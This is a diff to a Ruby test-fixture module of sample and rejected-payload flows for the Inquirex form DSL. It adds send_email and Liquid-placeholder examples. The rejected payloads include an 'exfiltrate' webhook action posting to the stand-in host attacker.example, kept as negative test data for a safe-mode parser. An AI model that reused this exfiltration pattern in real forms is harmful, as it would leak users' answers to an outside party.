@@ -129,11 +129,13 @@ module DslPayloads
   # @return [Hash{String => String}]
   def rich_flows
     {
-      "readme example"          => readme_example,
-      "email action heredocs"   => email_action_flow,
-      "accumulators and prices" => accumulator_flow,
-      "composed rules"          => composed_rules_flow,
-      "literal shapes"          => literal_shapes_flow
+      "readme example"             => readme_example,
+      "send_email declarations"    => send_email_flow,
+      "liquid in user-facing text" => liquid_text_flow,
+      "email action heredocs"      => email_action_flow,
+      "accumulators and prices"    => accumulator_flow,
+      "composed rules"             => composed_rules_flow,
+      "literal shapes"             => literal_shapes_flow
     }
   end
 
@@ -183,6 +185,79 @@ module DslPayloads
     RUBY
   end
 
+  # The top-level `send_email` verb, in both the single-quoted-heredoc form the
+  # docs prescribe and a one-line form, twice over — a flow may declare as many
+  # emails as it likes.
+  #
+  # @return [String]
+  def send_email_flow
+    <<~'RUBY'
+      Inquirex.define id: "waitlist" do
+        accumulator :price, type: :currency, default: 0
+        start :name
+
+        ask :name do
+          type :string
+          question "What is your name?"
+          transition to: :email
+        end
+
+        ask :email do
+          type :email
+          question "Where can we reach you?"
+        end
+
+        send_email do
+          to      "{{ answers.email }}"
+          from    "Qualified.At"
+          subject "Thank you for filling the form"
+          body_markdown <<~'TEXT'
+            Dear {{ answers.name }},
+
+            Thank you for filling out the form. Your total is
+            ${{ accumulators.price | round: 2 }} minimum.
+          TEXT
+        end
+
+        send_email do
+          to "owner@example.com"
+          subject "New lead: {{ answers.name }}"
+          body_markdown "**{{ answers.name }}** <{{ answers.email }}> just finished the form."
+        end
+      end
+    RUBY
+  end
+
+  # Liquid placeholders in every user-facing string. They are ordinary text to
+  # the parser — which is the point: `{{ }}` gives an author what they would
+  # otherwise reach for `#{}` to do, without the arbitrary code execution.
+  #
+  # @return [String]
+  def liquid_text_flow
+    <<~'RUBY'
+      Inquirex.define do
+        accumulator :price, type: :currency, default: 0
+        start :name
+
+        ask :name do
+          type :string
+          question "What is your name?"
+          transition to: :email
+        end
+
+        ask :email do
+          type :email
+          question "Thanks {{ answers.name }}, where can we reach you?"
+          transition to: :quote
+        end
+
+        say :quote do
+          text "{{ answers.name }}, your estimate is ${{ accumulators.price | round: 2 }}."
+        end
+      end
+    RUBY
+  end
+
   # Multi-line send_email bodies. Prism parses a dedented heredoc as an
   # InterpolatedStringNode whose parts are all plain StringNodes, so rejecting
   # that node class outright would break this — the reason
@@ -192,7 +267,6 @@ module DslPayloads
   def email_action_flow
     <<~RUBY
       Inquirex.define id: "lead-intake" do
-        allowed_domains "*.agentica.group", "example.com"
         meta title: "Lead Intake",
              brand: { name: "Agentica", logo: "https://cdn.example.com/logo.png" },
              theme: { brand: "#2563eb", radius: "18px", font: "Inter, system-ui" }
@@ -310,7 +384,6 @@ module DslPayloads
   def literal_shapes_flow
     <<~'RUBY'
       Inquirex.define do
-        allowed_domains %w[a.example.com b.example.com]
         start :choices
 
         ask :choices do
@@ -413,9 +486,13 @@ module DslPayloads
       ),
       "bare constant"        => in_step("text SomeConstant"),
       "constant path"        => in_step("text Inquirex::VERSION"),
+      # The `webhook` effect, `allowed_domains` and the `{ file: "path" }` body
+      # form were removed from the gem in 0.7.0 rather than merely excluded
+      # from safe mode. These payloads assert the words no longer resolve at
+      # all — a stronger property than "the allowlist refuses them", since
+      # `unsafe: true` cannot bring them back either.
       "webhook effect"       => <<~RUBY,
         Inquirex.define do
-          allowed_domains "attacker.example"
           start :a
 
           say :a do
@@ -424,6 +501,16 @@ module DslPayloads
 
           action :exfiltrate do
             webhook url: "https://attacker.example/collect"
+          end
+        end
+      RUBY
+      "allowed_domains"      => <<~RUBY,
+        Inquirex.define do
+          allowed_domains "attacker.example"
+          start :a
+
+          say :a do
+            text "x"
           end
         end
       RUBY
